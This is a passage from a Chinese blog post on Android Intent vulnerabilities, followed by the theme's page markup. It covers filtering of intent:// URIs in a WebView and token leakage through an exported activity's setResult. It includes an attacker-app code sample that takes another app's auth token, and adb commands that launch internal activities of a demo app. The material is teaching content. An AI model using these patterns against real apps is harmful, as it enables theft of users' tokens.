class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br>安全做法（做一些过滤）：<br><span class="hljs-keyword">if</span> (url.startsWith(<span class="hljs-string">&quot;intent://&quot;</span>)) &#123;<br>    Intent <span class="hljs-built_in">int</span>ent = Intent.parseUri(url, Intent.URI_INTENT_SCHEME);<br>    <span class="hljs-comment">// 移除 component，防止启动任意组件</span><br>    <span class="hljs-built_in">int</span>ent.setComponent(<span class="hljs-literal">null</span>);<br>    <span class="hljs-comment">// 移除敏感 flag</span><br>    <span class="hljs-built_in">int</span>ent.removeFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);<br>    <span class="hljs-built_in">int</span>ent.removeFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);<br>    <span class="hljs-comment">// 添加安全 flag</span><br>    <span class="hljs-built_in">int</span>ent.addCategory(Intent.CATEGORY_BROWSABLE);<br>    startActivity(<span class="hljs-built_in">int</span>ent);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>adb演示：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">adb shell am start -n com<span class="hljs-selector-class">.demo</span>.intentsecurity/<span class="hljs-selector-class">.VulnWebViewActivity</span> \<br>    <span class="hljs-attr">--es</span> url <span class="hljs-string">&quot;intent://dummy#Intent;component=com.demo.intentsecurity/.InternalTokenActivity;end&quot;</span><br></code></pre></td></tr></table></figure>
+
+<img src="/2026/04/30/Intent/image-20260502200620246.png" srcset="/img/loading.gif" lazyload class="" title="image-20260502200620246">
+
+<p>点击链接后：</p>
+<img src="/2026/04/30/Intent/image-20260502200633293.png" srcset="/img/loading.gif" lazyload class="" title="image-20260502200633293">
+
+<h2 id="setResult-数据回传泄露"><a href="#setResult-数据回传泄露" class="headerlink" title="setResult 数据回传泄露"></a>setResult 数据回传泄露</h2><p>正常APP A启动APP B：</p>
+<p>startActivity()，但是没有返回值</p>
+<p>startActivityForResult()：启动后还有返回值可以带回APP A。</p>
+<p>一旦APP A的这个startActivityForResult()可导出，那么就能劫持拿到其中的隐私信息。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 受害 App 的导出 Activity</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TokenActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Activity</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br>        <span class="hljs-comment">// 生成 token 并回传给调用者</span><br>        <span class="hljs-type">Intent</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>        result.putExtra(<span class="hljs-string">&quot;token&quot;</span>, generateAuthToken());<br>        setResult(RESULT_OK, result);<br>        finish();<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// 攻击者的 App</span><br><span class="hljs-type">Intent</span> <span class="hljs-variable">intent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>intent.setClassName(<span class="hljs-string">&quot;com.victim.app&quot;</span>, <span class="hljs-string">&quot;com.victim.app.TokenActivity&quot;</span>);<br>startActivityForResult(intent, <span class="hljs-number">1</span>);<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onActivityResult</span><span class="hljs-params">(<span class="hljs-type">int</span> requestCode, <span class="hljs-type">int</span> resultCode, Intent data)</span> &#123;<br>    <span class="hljs-keyword">if</span> (data != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> data.getStringExtra(<span class="hljs-string">&quot;token&quot;</span>);<br>        <span class="hljs-comment">// 拿到了受害 App 的 auth token</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>adb演示：</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">adb <span class="hljs-keyword">shell</span> <span class="hljs-keyword">am</span> start -n <span class="hljs-keyword">com</span>.demo.intentsecurity/.VulnResultActivity<br>adb logcat -s VulnResult<br></code></pre></td></tr></table></figure>
+
+<img src="/2026/04/30/Intent/image-20260502200717038.png" srcset="/img/loading.gif" lazyload class="" title="image-20260502200717038">
+
+
+
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/4825">https://forum.butian.net/share/4825</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Android/" class="category-chain-item">Android</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/Android/Android-APP/" class="category-chain-item">Android APP</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Intent</div>
+      <div>https://yy-t1.github.io/2026/04/30/Intent/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>bsahfm</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月30日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/05/02/Binder/" title="Binder">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Binder</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/04/30/%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6/" title="四大组件">
+                        <span class="hidden-mobile">四大组件</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"A72cL0RlIkmsXlCGMx51Qi51-gzGzoHsz","appKey":"xxsSPn2ge0tYPU7nwv5Gyd1r","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
